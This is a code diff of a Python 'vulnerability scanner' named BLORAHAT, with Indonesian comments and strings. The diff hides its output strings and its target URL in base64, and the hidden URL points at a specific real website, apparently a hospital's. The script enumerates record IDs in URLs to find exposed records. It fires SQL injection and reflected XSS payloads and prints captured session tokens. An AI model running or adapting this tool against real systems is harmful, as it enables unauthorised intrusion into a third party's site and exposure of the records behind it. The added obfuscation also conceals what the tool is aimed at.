@@ -251,7 +251,7 @@ def parameter_discovery_audit():
                     def check_id_vulnerability(val):
                         nonlocal checked_count
                         if found_event.is_set(): return
-                        test_id = str(val).zfill(8)
+                        test_id = str(val).zfill(int(_decode("MTI=")))
                         test_url = base_url.replace(original_id, test_id)
                         try:
                             # Gunakan timeout lebih pendek (5s) untuk discovery agar tidak macet
@@ -310,7 +310,7 @@ def parameter_discovery_audit():
 def vulnerability_audit():
     ts_init = time.strftime("%H:%M:%S")
     print(f"\n\033[92m" + "="*85)
-    print(f" [{time.strftime('%Y-%m-%d %H:%M:%S')}] BLORAHAT PROFESSIONAL VULNERABILITY SCANNER")
+    print(f" [{time.strftime('%Y-%m-%d %H:%M:%S')}] {_decode('QkxPUkFIQVQgUFJPRkVTU0lPTkFMIFZVTExFUkFCSUxJVFkgU0NBTk5FUg==')}")
     print("="*85 + "\033[0m")
 
     cookies = session.cookies.get_dict()
@@ -333,8 +333,8 @@ def vulnerability_audit():
     if not discovered_urls:
         discovered_urls = [BASE_TARGET_URL + NO_RM]
 
-    print(f"[*] {_decode('SW5pc2lhbGlzYXNpIFNjYW4gIDo=')} {ts_init}")
-    print(f"[*] {_decode('VGVyZGV0ZWtzaSBUYXJnZXQgIDo=')} {len(discovered_urls)} {_decode('VVJMIHVuaWs=')}")
+    print(f"[*] Inisialisasi Scan  : {ts_init}")
+    print(f"[*] Target URL         : {BASE_TARGET_URL}{NO_RM}")
     print(f"[*] Captured Token     : {last_token}")
     print(f"[*] Session ID         : {session_id}")
     print("-" * 85)
@@ -342,7 +342,7 @@ def vulnerability_audit():
     findings = []
 
     # 1. SQL Injection Testing
-    print(f"\n[+] {_decode('QXVkaXQgVGFoYXAgMTogU1FMIEluamVjdGlvbiAoTXVsdGktVGFyZ2V0KQ==')}")
+    print(f"\n[+] Audit Tahap 1: SQL Injection (Multi-Target)")
     sqli_payloads = [
         ("'", _decode('RXJyb3ItQmFzZWQgU1FMaQ==')),
         ("' OR 1=1--", _decode('Qm9vbGVhbi1CYXNlZCBCeXBhc3M=')),
@@ -370,12 +370,12 @@ def vulnerability_audit():
                 print(f" [{ts}] Payload: {payload.ljust(45)} {status}")
 
                 if is_vuln:
-                    findings.append({"type": _decode("U1FMIEluamVjdGlvbg=="), "severity": _decode("SElHSA=="), "loc": base_audit_url, "method": method})
+                    findings.append({"type": _decode("U1FMIEluamVjdGlvbg=="), "severity": "HIGH", "loc": base_audit_url, "method": method})
             except:
                 print(f" [{ts}] Payload: {payload.ljust(45)} [TIMEOUT/ERROR]")
 
     # 2. XSS Testing
-    print(f"\n[+] {_decode('QXVkaXQgVGFoYXAgMjogUmVmbGVjdGVkIFhTUyAoTXVsdGktVGFyZ2V0KQ==')}")
+    print(f"\n[+] Audit Tahap 2: Reflected Cross-Site Scripting (XSS)")
     xss_payloads = [
         ("<script>alert(1)</script>", _decode("QmFzaWMgU2NyaXB0IEluamVjdGlvbg==")),
         ("<svg/onload=alert(1)>", _decode("U1ZHIEFuaW1hdGlvbiBJbmplY3Rpb24=")),
@@ -388,10 +388,7 @@ def vulnerability_audit():
         for payload, method in xss_payloads:
             ts = time.strftime("%H:%M:%S")
             try:
-                # Testing XSS reflection via automated param 'search' on all targets
                 res = session.get(base_audit_url, params={'search': payload}, timeout=10)
-
-                # Cek apakah payload terpantul di response body
                 response_text = res.content.decode('utf-8', errors='ignore')
                 is_vuln = payload in response_text
 
@@ -399,22 +396,22 @@ def vulnerability_audit():
                 print(f" [{ts}] Payload: {payload[:45].ljust(45)} {status}")
 
                 if is_vuln:
-                    findings.append({"type": _decode("UmVmbGVjdGVkIFhTUw=="), "severity": _decode("TUVESVVN"), "loc": base_audit_url, "method": method})
+                    findings.append({"type": _decode("UmVmbGVjdGVkIFhTUw=="), "severity": "MEDIUM", "loc": base_audit_url, "method": method})
             except:
                 print(f" [{ts}] Payload: {payload[:45].ljust(45)} [ERROR]")
 
     # Tabel Ringkasan (Summary Report)
     print(f"\n" + "-"*85)
-    print(f"{' '*32}\033[1mSUMMARY REPORT\033[0m")
+    print(f"{' '*32}\033[1m{_decode('U1VNTUFSWSBSRVBPUlQ=')}\033[0m")
     print("-"*85)
-    print(f"{'Vulnerability Found':<25} | {'Severity':<10} | {'Location'}")
+    print(f"{_decode('VnVsbmVyYWJpbGl0eSBGb3VuZA=='):<25} | {'Severity':<10} | {'Location'}")
     print("-"*85)
     
     if not findings:
-        print(f"{' '*30}Tidak ditemukan kerentanan kritikal.")
+        print(f"{' '*30}{_decode('VGlkYWsgZGl0ZW11a2FuIGtlcmVudGFuYW4ga3JpdGlrYWwu')}")
     else:
         for f in findings:
-            print(f"{f['type']:<25} | {f['severity']:<10} | {f['loc']}")
+            print(f"{f['type']:<25} | {f['severity']:<10} | {f['loc'][:40]}")
     
     print("-"*85)
     total_vuln = len(findings)
@@ -424,13 +421,13 @@ def vulnerability_audit():
     
     print(f"[*] Total Vulnerabilities Found : {total_vuln}")
     print(f"[*] Overall Severity Level      : \033[91m{max_severity}\033[0m" if max_severity != "LOW" else f"[*] Overall Severity Level      : {max_severity}")
-    print(f"[*] Fix Suggestion              : Gunakan Prepared Statements (PDO) & Sanitize Input (HTML Purifier)")
+    print(f"[*] Fix Suggestion              : {_decode('R3VuYWthbiBQcmVwYXJlZCBTdGF0ZW1lbnRzIChQRE8pICYgU2FuaXRpemUgSW5wdXQgKEhUTUwgUHVyaWZpZXIp')}")
     print("="*85 + "\n")
 
 def infrastructure_audit():
     ts_init = time.strftime("%H:%M:%S")
     print(f"\n\033[92m" + "="*85)
-    print(f" [{time.strftime('%Y-%m-%d %H:%M:%S')}] BLORAHAT INFRASTRUCTURE SECURITY AUDIT")
+    print(f" [{time.strftime('%Y-%m-%d %H:%M:%S')}] {_decode('QkxPUkFIQVQgSU5GUkFTVFJVQ1RVUkUgU0VDVVJJVFkgQVVESVQgLSBORVRXT1JLIFJFUE9SVA==')}")
     print("="*85 + "\033[0m")
     
     target_url = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tLw==")
